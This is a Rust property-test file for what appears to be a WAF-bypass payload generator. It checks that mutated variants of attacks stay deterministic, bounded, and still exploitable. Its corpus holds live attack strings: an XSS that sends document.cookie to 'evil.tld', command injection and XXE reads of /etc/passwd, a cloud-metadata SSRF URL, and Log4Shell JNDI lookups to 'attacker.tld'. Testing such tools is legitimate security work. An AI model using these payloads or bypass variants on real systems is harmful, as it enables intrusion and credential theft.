//! Flaky-bug + property audit for the equivalence generators
//! (ssrf/nosql/log4shell/xxe added 2026-05-18) and the systematic XSS
//! engine. These hunt the failure classes a one-shot example test
//! misses: non-determinism (RNG misuse, `HashSet`-iteration-order
//! leakage), unsoundness at scale, panics / unbounded output on
//! hostile input, and silent exploit-target drift.
//!
//! Every assertion names a concrete invariant; none would pass if the
//! generator returned `Vec::new()` (the corpus is non-trivial and the
//! soundness/invariance checks are exact).

use proptest::prelude::*;
use wafrift_grammar::grammar::equiv::{self, EquivConfig};
// `equiv::xss` holds the soundness oracle; the grammar XSS *mutator*
// (`mutate`, scald's surface) is a different module — keep them
// distinct or `gxss::mutate` fails to resolve.
use wafrift_grammar::grammar::equiv::{log4shell, nosql, ssrf, xss as eqxss, xxe};
use wafrift_grammar::grammar::xss as gxss;

fn cfg(seed: u64, max: usize) -> EquivConfig {
    EquivConfig {
        seed,
        max,
        verify: true,
        vary_delivery: true,
        param: "q".into(),
        force_delivery: None,
    }
}

/// Representative real attacks per equiv class.
const CORPUS: &[(&str, &str)] = &[
    ("sql", "1' OR '1'='1'-- -"),
    ("sql", "1 UNION SELECT username,password FROM users-- -"),
    ("xss", "<svg onload=alert(1)>"),
    ("xss", "<img src=x onerror=fetch('//evil.tld/c?'+document.cookie)>"),
    ("cmdi", "; cat /etc/passwd #"),
    ("path", "../../../../etc/passwd"),
    ("ssti", "{{7*7}}"),
    ("ldap", "*)(|(uid=*"),
    ("ssrf", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("nosql", r#"{"username":{"$ne":null},"pw":{"$regex":".*"}}"#),
    ("log4shell", "${jndi:ldap://10.0.0.1:1389/Basic/Command/x}"),
    ("xxe", r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>"#),
];

/// THE flaky-bug detector: a generator must be a pure function of
/// `(payload, cfg)`. If its output (membership OR order) depends on
/// `HashSet`/`HashMap` iteration, two threads — which get *different*
/// `RandomState` seeds — produce different `Vec`s. A single-process
/// repeat would hide that; cross-thread exposes it deterministically.
#[test]
fn generators_are_pure_not_hashset_order_dependent() {
    for &(class, payload) in CORPUS {
        let c = cfg(0xA5A5_1234, 48);
        let p = payload.to_string();
        let (cl, pl, cf) = (class.to_string(), p.clone(), c.clone());
        let t1 = std::thread::spawn(move || {
            equiv::equiv_for(&cl, &pl, &cf)
                .into_iter()
                .map(|m| (m.payload, m.delivery.label(), m.rules.join("+")))
                .collect::<Vec<_>>()
        });
        let main = equiv::equiv_for(class, payload, &c)
            .into_iter()
            .map(|m| (m.payload, m.delivery.label(), m.rules.join("+")))
            .collect::<Vec<_>>();
        let other = t1.join().expect("generator thread panicked");
        assert_eq!(
            main, other,
            "{class} generator is NOT deterministic across threads — \
             output depends on HashSet iteration order (flaky bug)"
        );
        assert!(!main.is_empty(), "{class}: empty for a real attack {payload:?}");
    }
    // The XSS grammar mutator (scald's surface) — same contract.
    for &(class, payload) in CORPUS.iter().filter(|(c, _)| *c == "xss") {
        let _ = class;
        let p = payload.to_string();
        let t = std::thread::spawn(move || {
            gxss::mutate(&p, 60).into_iter().map(|m| m.payload).collect::<Vec<_>>()
        });
        let main: Vec<_> = gxss::mutate(payload, 60).into_iter().map(|m| m.payload).collect();
        assert_eq!(
            main,
            t.join().unwrap(),
            "gxss::mutate is HashSet-order-dependent (flaky across processes)"
        );
    }
}

/// Same seed ⇒ byte-identical stream; a *different* seed must actually
/// move the stream (RNG genuinely wired, not ignored).
#[test]
fn seed_determinism_and_sensitivity() {
    // (1) PER-CLASS: same seed ⇒ byte-identical stream (the property
    //     that actually matters for reproducible bypasses).
    // (2) GLOBAL: the seed is genuinely wired — at least one corpus
    //     payload's stream (order or content) changes with the seed.
    //     A per-class `seed1 != seed2` set check is UNSOUND: a small
    //     equivalence class (e.g. ldap `*)(|(uid=*` → ~9 case/OID
    //     forms) is fully exhausted when `max` ≥ |class|, so every
    //     seed yields the same SET by construction — that is correct
    //     exhaustive behaviour, not an ignored RNG.
    let mut seed_moved_somewhere = false;
    for &(class, payload) in CORPUS {
        let a: Vec<_> = equiv::equiv_for(class, payload, &cfg(1, 40))
            .into_iter()
            .map(|m| m.payload)
            .collect();
        let b: Vec<_> = equiv::equiv_for(class, payload, &cfg(1, 40))
            .into_iter()
            .map(|m| m.payload)
            .collect();
        assert_eq!(a, b, "{class}: same seed not reproducible (RNG misuse)");
        let c: Vec<_> = equiv::equiv_for(class, payload, &cfg(2, 40))
            .into_iter()
            .map(|m| m.payload)
            .collect();
        if a != c {
            seed_moved_somewhere = true;
        }
    }
    assert!(
        seed_moved_somewhere,
        "seed is INERT across the entire corpus — the RNG is ignored"
    );
}

/// Output is bounded by `cfg.max` for every class — no unbounded
/// amplification (a proxy-scale DoS otherwise).
#[test]
fn output_is_bounded_by_max() {
    for &(class, payload) in CORPUS {
        for max in [0usize, 1, 7, 64, 200] {
            let n = equiv::equiv_for(class, payload, &cfg(9, max)).len();
            assert!(n <= max, "{class}: {n} members > cap {max}");
        }
    }
}

/// CROSS-CLASS DELIVERY SOUNDNESS: adding the raw `HeaderValue`/
/// `Cookie` shapes to the *shared* `delivery_set` means EVERY class —
/// not just XSS — could otherwise pair a CR/LF/`;`/space-bearing
/// payload with a raw channel whose `to_request` strips those bytes,
/// making `member.payload` differ from what reaches the backend (an
/// unsound, rigged member). The shared `enforce_transport_legal`
/// finalizer must hold for all 10 classes on real attacks and across
/// seeds. A regression that dropped the finalizer from any one
/// generator flips this for that class.
#[test]
fn every_emitted_member_is_transport_legal_for_its_delivery() {
    for &(class, payload) in CORPUS {
        let mut any = false;
        for seed in [1u64, 7, 0xDEAD_BEEF, 0x7761_6672_6966_7421] {
            for max in [8usize, 24, 64] {
                let members = equiv::equiv_for(class, payload, &cfg(seed, max));
                for m in &members {
                    any = true;
                    assert!(
                        m.delivery.transport_legal(&m.payload),
                        "{class}: emitted {} member whose payload {:?} is \
                         ILLEGAL for that channel — to_request would strip \
                         bytes, so the delivered attack ≠ member.payload",
                        m.delivery.label(),
                        m.payload
                    );
                }
            }
        }
        assert!(any, "{class}: no members for real attack {payload:?}");
    }
}

proptest! {
    #![proptest_config(ProptestConfig { cases: 4000, max_shrink_iters: 200, ..ProptestConfig::default() })]

    /// No equiv generator may panic OR exceed its cap on ARBITRARY
    /// input (unicode, control bytes, huge). This is the class the
    /// `<script>日本語</script>` `exec_spans` panic belonged to.
    #[test]
    fn generators_never_panic_and_stay_bounded(s in ".{0,400}", seed in any::<u64>()) {
        for class in ["sql", "xss", "cmdi", "path", "ssti", "ldap", "ssrf", "nosql", "log4shell", "xxe"] {
            let out = equiv::equiv_for(class, &s, &cfg(seed, 32));
            prop_assert!(out.len() <= 32, "{} unbounded on {:?}", class, s);
        }
        let _ = gxss::mutate(&s, 40);
        let _ = gxss::mutate(&s, 0);
    }

    /// SOUNDNESS AT SCALE: a member the generator emits must pass that
    /// class's INDEPENDENT soundness oracle — it never ships a
    /// non-attack (anti-rig), on thousands of seeds/payloads.
    #[test]
    fn every_emitted_member_is_oracle_sound(seed in any::<u64>(), pick in 0usize..12) {
        let (class, payload) = CORPUS[pick];
        for m in equiv::equiv_for(class, payload, &cfg(seed, 24)) {
            let ok = match class {
                "xss" => eqxss::still_executes_xss(payload, &m.payload),
                "ssrf" => ssrf::still_targets(payload, &m.payload),
                "nosql" => nosql::still_injects(payload, &m.payload),
                "log4shell" => log4shell::still_executes(payload, &m.payload),
                "xxe" => xxe::still_exfils(payload, &m.payload),
                // sql/cmdi/path/ssti/ldap self-verify inside generate();
                // re-deriving their predicate here would duplicate it.
                _ => !m.payload.is_empty(),
            };
            prop_assert!(ok, "{} emitted UNSOUND member {:?}", class, m.payload);
        }
    }

    /// ANTI-RIG TARGET INVARIANCE: a sound rewrite never silently
    /// changes the exploit's target. Randomised across seeds.
    #[test]
    fn exploit_target_never_drifts(seed in any::<u64>()) {
        // ssrf: every member resolves to the SAME internal IP+path.
        let ssrf_atk = "http://127.0.0.1:8080/admin";
        for m in equiv::equiv_for("ssrf", ssrf_atk, &cfg(seed, 16)) {
            prop_assert!(
                ssrf::still_targets(ssrf_atk, &m.payload),
                "ssrf target drifted: {:?}", m.payload
            );
            prop_assert!(
                !m.payload.contains("8.8.8.8"),
                "ssrf escaped to a public host: {:?}", m.payload
            );
        }
        // log4shell: protocol+authority+path of the JNDI fetch fixed.
        let l4 = "${jndi:ldap://attacker.tld/a}";
        for m in equiv::equiv_for("log4shell", l4, &cfg(seed, 16)) {
            prop_assert!(log4shell::still_executes(l4, &m.payload),
                "log4shell jndi target drifted: {:?}", m.payload);
        }
        // xxe: the fetched external entity set is invariant.
        let x = r#"<!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]><r>&e;</r>"#;
        for m in equiv::equiv_for("xxe", x, &cfg(seed, 16)) {
            prop_assert!(xxe::still_exfils(x, &m.payload),
                "xxe fetched-URI set drifted: {:?}", m.payload);
        }
    }
}
